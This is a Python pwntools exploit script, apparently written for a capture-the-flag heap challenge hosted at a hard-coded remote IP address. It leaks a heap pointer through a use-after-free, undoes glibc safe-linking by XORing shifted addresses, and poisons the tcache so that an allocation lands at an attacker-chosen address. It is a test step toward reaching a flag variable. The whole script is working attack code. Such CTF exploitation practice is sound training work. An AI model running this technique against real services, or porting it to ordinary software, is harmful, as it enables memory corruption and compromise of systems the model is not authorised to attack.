#!/usr/bin/env python3
"""
Test: just verify the tcache poisoning works by targeting X itself
"""
from pwn import *

context.log_level = 'info'

def connect():
    return remote('52.76.96.108', 9005)

def create(p, idx, size, data):
    p.sendline(b'1')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'size: ')
    p.sendline(str(size).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def edit(p, idx, size, data):
    p.sendline(b'2')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    p.send(data)

def banish(p, idx):
    p.sendline(b'3')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())

def recite(p, idx, size):
    p.sendline(b'4')
    p.recvuntil(b'index: ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'data: ')
    data = b''
    while len(data) < size:
        chunk = p.recv(size - len(data), timeout=3)
        if not chunk:
            break
        data += chunk
    p.recv(1)
    return data

p = connect()
p.recvuntil(b'> ')

# Create, banish, recreate to get X
create(p, 0, 0x80, b'A' * 0x10 + b'\n')
banish(p, 0)
data = recite(p, 0, 0x80)
fd0 = u64(data[0:8])
X = fd0 << 12
log.info(f"X = {hex(X)}")

# Reuse X for spell 1
create(p, 1, 0x80, b'B' * 0x10 + b'\n')

# New allocation for spell 2
create(p, 2, 0x80, b'C' * 0x10 + b'\n')

# Banish both
banish(p, 1)
banish(p, 2)

# Read spell 2 UAF
data = recite(p, 2, 0x80)
fd2 = u64(data[0:8])
log.info(f"fd2 = {hex(fd2)}")

# Calculate spell2 address
expected_fd2 = fd0 ^ X
addr_diff_shifted = fd2 ^ expected_fd2
spell2_shifted = fd0 ^ addr_diff_shifted
spell2_addr = spell2_shifted << 12
log.info(f"spell2_addr = {hex(spell2_addr)}")
log.info(f"offset = {hex(spell2_addr - X)}")

# Test: poison tcache to return X itself (not g_flag)
# This should work and give us back X
target = X  # Just test with X first
protected = spell2_shifted ^ target
log.info(f"Targeting X itself: {hex(target)}")
log.info(f"protected = {hex(protected)}")

payload = p64(protected) + b'\x00' * (0x80 - 8)
edit(p, 2, 0x80, payload)

log.info("Creating spell 3 (should return spell2)")
create(p, 3, 0x80, b'D' * 0x10 + b'\n')

log.info("Creating spell 4 (should return X)")
create(p, 4, 0x80, b'\n')

log.info("Reading spell 4 (should be at X)")
data = recite(p, 4, 0x80)
log.info(f"data[:32]: {data[:32].hex()}")

# spell 4 should be at X, which had 'B' * 0x10 written
# But we just wrote '\n' to it, so it should be mostly zeros with newline at pos 0
# Actually, the create function writes the data, so it overwrites
# Let me check spell 0 (UAF) which still points to X
data0 = recite(p, 0, 0x80)
log.info(f"spell0 (X) data[:32]: {data0[:32].hex()}")

p.sendline(b'0')
p.close()
